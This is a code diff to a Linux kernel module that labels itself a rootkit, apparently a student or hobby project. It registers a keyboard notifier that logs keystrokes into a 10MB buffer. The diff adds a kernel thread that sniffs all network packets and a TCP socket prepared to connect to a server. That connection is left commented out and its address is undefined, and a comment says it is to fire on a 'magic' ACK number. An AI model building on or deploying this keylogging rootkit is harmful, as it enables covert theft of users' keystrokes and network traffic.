@@ -13,20 +13,29 @@
  *   + Kevin Hoganson
  *   + Alexander Slonim
 **/
-#include <linux/semaphore.h>
-#include <linux/keyboard.h>
-#include <linux/syscalls.h>
-#include <linux/kthread.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
-#include <linux/string.h>
-#include <linux/fcntl.h>
-#include <linux/init.h>
+
+#include <asm/uaccess.h>
+#include <asm/segment.h>
+
+#include <linux/netdevice.h>
+#include <linux/socket.h>
+#include <linux/tcp.h>
+#include <linux/net.h>
+#include <linux/ip.h>
+#include <linux/in.h>
+
+#include <linux/keyboard.h>				/* Used for keyboard_notifier.		*/
+#include <linux/syscalls.h>				/* Used for syst calls (kern/usr).  */
+#include <linux/kthread.h>				/* Used to create network thread.   */
 
 #define KEYBOARD_BUFFER_SIZE 10000000	/* Allocate 10MB for keylog buffer. */
 
 #define SHIFT_ENABLED  1				/* Shift key is enabled.  */
 #define SHIFT_DISABLED 0				/* Shift key is disabled. */
+
+mm_segment_t oldfs;
 
 /**
  * KEYLOGGER FUNCTIONALITY
@@ -34,13 +43,15 @@
 char keyboard_buffer[KEYBOARD_BUFFER_SIZE];
 int  keyboard_index;
 int  shift_state;
-int  caps_state ;
 
 
 /**
  * NETWORK LISTENING FUNCTIONALITY
 **/
+struct packet_type  net_proto;
 struct task_struct *net_thread;
+struct sockaddr_in  sock_in;
+struct socket      *sock;
 
 
 /**
@@ -84,7 +95,7 @@ int notification(struct notifier_block *nblock, unsigned long code, void *_param
 	struct keyboard_notifier_param *param = _param;
 	char   *buffer;
 	char   *key;
-	char   c ;
+	char   c;
 	int    i;
 
 	// 83 character values are registered above (letters). 
@@ -147,6 +158,16 @@ static struct notifier_block nb =
 };
 
 
+int packet_rcv(struct sk_buff *skb, struct net_device *dev,
+	struct packet_type *ptype, struct net_device *orig_dev)
+{
+	printk("One packet received.\n");
+
+	kfree_skb(skb);
+	return 0;
+}
+
+
 /**
  * TODO:
  *   - Add network-listening functionality.
@@ -154,7 +175,27 @@ static struct notifier_block nb =
 **/
 int start_listen(void *args)
 {
-	printk("This prints.\n");
+	/* Use after receiving the "magic" ACK number. */
+	/**
+	printk("Attempting to connect to server [expected not to].\n");
+	if (sock->ops->connect(sock, (struct sockaddr*)&sock_in, sizeof(sock_in), 0) < 0)
+		printk("Could not connect [expected].\n");
+	else
+		printk("Connected to server.\n");
+	**/
+	printk("Starting network sniffing.\n");
+	net_proto.type = htons(ETH_P_ALL);
+	net_proto.dev  = NULL;
+	net_proto.func = packet_rcv;
+	dev_add_pack(&net_proto);
+
+	if (sock)
+		printk("Initialized.\n");
+	else
+		printk("Nope.\n");
+
+	printk("Stopping network-listening thread.\n");
+	kthread_stop(net_thread);
 
 	return 0;
 }
@@ -172,18 +213,29 @@ int start_listen(void *args)
 int start(void)
 {
 	printk("Rootkit started.\n");
-
+	
 	printk("Registering keyboard notifier.\n");
 	register_keyboard_notifier(&nb);
 	keyboard_index = 0;
 
+	printk("Initializing network socket.\n");
+	if(sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock) < 0)
+	{
+		printk("Error in creating socket.\n");
+		return 1;
+	}
+
+	/**
+	 * server_ip and server_port are undefined.
+	**/
+	memset(&sock_in, 0, sizeof(sock_in));
+	//sock_in.sin_addr.s_addr = htonl(server_ip);
+	sock_in.sin_family = AF_INET;
+	//sock_in.sin_port = htons(server_port);
+
 	printk("Starting network-listening thread.\n");
 	net_thread = kthread_create(start_listen, NULL, "network_listener");
 	wake_up_process(net_thread);
-
-	printk("Stopping network-listening thread.\n");
-	kthread_stop(net_thread);
-	printk("Network-listening thread stopped.\n");
 
 	return 0;
 }
@@ -193,6 +245,9 @@ void stop(void)
 	printk("Unregistering keyboard notifier.\n");
 	unregister_keyboard_notifier(&nb);
 	printk("Keyboard notifier unregistered.\n"); 
+
+	printk("Removing netdevice pack.\n");
+	dev_remove_pack(&net_proto);
 
 	printk("Rootkit stopped.\n");
 }
